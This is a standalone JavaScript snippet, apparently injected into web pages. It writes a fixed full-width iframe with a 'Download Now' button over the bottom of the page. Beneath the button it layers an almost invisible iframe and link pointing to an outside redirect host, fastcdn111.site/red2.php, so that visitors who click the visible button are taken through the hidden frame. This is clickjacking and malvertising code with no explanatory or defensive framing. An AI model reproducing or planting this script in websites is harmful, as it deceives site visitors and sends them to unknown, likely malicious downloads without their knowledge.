var randomColor = Math.floor(Math.random() * 16777215).toString(16);
var wk_frame = document.createElement('iframe');
wk_frame.style = "background: none !important; border: 0px !important; box-shadow: none !important; margin: 0px !important; outline: 0px !important; padding: 0px !important; position: fixed !important; width: 100% !important; z-index: 2147483647 !important; height: 96px !important; max-width: 100% !important; right: 0px !important; bottom: 0px !important;";
var html = '';
html += '<html>';
html += ' <head><style>.rV8cd659937ac9703ccfe4731e9c0deb5b1 { position:fixed !important; bottom:0px !important; right: 0px !important; background-color:#ffffff transparent !important; width:100% !important; z-index:2147483647 !important; padding:2px !important; margin:auto !important; text-align:center !important; float:none !important; } .rV8cd659937ac9703ccfe4731e9c0deb5b2 { color: white; border: 1px #56aa71 solid !important; background-color:#' + randomColor + ' !important; width:80% !important; padding:4px !important; text-align:center !important; margin:0 !important; border-radius: 5px !important; margin:auto !important; text-align:center !important; float:none !important; position: relative; bottom: -25px; } .rV8cd659937ac9703ccfe4731e9c0deb5b1 a{ color:white !important; text-decoration: none !important; } center { visibility: visible !important; } .rV8cd659937ac9703ccfe4731e9c0deb5bclose {display:block; position: fixed; right: 120px; width:  20px; height: 20px; opacity: 0.3; bottom: 50px; text-decoration: none; } .rV8cd659937ac9703ccfe4731e9c0deb5bclose:hover { opacity: 1;} .rV8cd659937ac9703ccfe4731e9c0deb5bclose:before, .rV8cd659937ac9703ccfe4731e9c0deb5bclose:after {position: fixed;left: 15px;height: 33px;width: 2px;} .rV8cd659937ac9703ccfe4731e9c0deb5bbtnse1 { color: white;padding: 12px 30px;cursor: pointer;font-size: 20px;position: absolute;margin: 100px 0px 0px -105px;} .rV8cd659937ac9703ccfe4731e9c0deb5bbdr4{border: solid;background-color: #' + randomColor + ' ;border-radius: 5px;}</style></head>';
html += '  <body>';
html += '      <div id="rV8cd659937ac9703ccfe4731e9c0deb5b1d"> <a id="rV8cd659937ac9703ccfe4731e9c0deb5bclose" href="#rV8cd659937ac9703ccfe4731e9c0deb5bsam" class="rV8cd659937ac9703ccfe4731e9c0deb5bclose" onclick="return parent.wkf_remove(this.window);">[x]</a> <div class="rV8cd659937ac9703ccfe4731e9c0deb5b1"> <button class="rV8cd659937ac9703ccfe4731e9c0deb5b2" >Download Now</button> <div style=" width:100%; opacity:0.0002;"> <center><iframe id="rV8cd659937ac9703ccfe4731e9c0deb5b7" scrolling="no" style="width: 100%; height: 59px; margin: -18px;"  class="lazyload"  src="//fastcdn111.site/red2.php?rand=rV8cd659937ac9703ccfe4731e9c0deb5b&id=27"  frameborder="0" marginheight="0" marginwidth="0"  replaced="true"><div class="rV8cd659937ac9703ccfe4731e9c0deb5b1"><a href="//fastcdn111.site/red2.php?rand=rV8cd659937ac9703ccfe4731e9c0deb5b&id=12" rel="nofollow" target="_blank"><div class="rV8cd659937ac9703ccfe4731e9c0deb5b2"><b>DOWNLOAD NOW</b></div></a></div></iframe></center></div></div>  </div> </div></div></center>';
html += '      </div>';
html += '  </body></html>';
document.body.appendChild(wk_frame);
wk_frame.contentWindow.document.open();
wk_frame.contentWindow.document.write(html);
wk_frame.contentWindow.document.close();

function wkf_remove() {
    wk_frame.remove();
}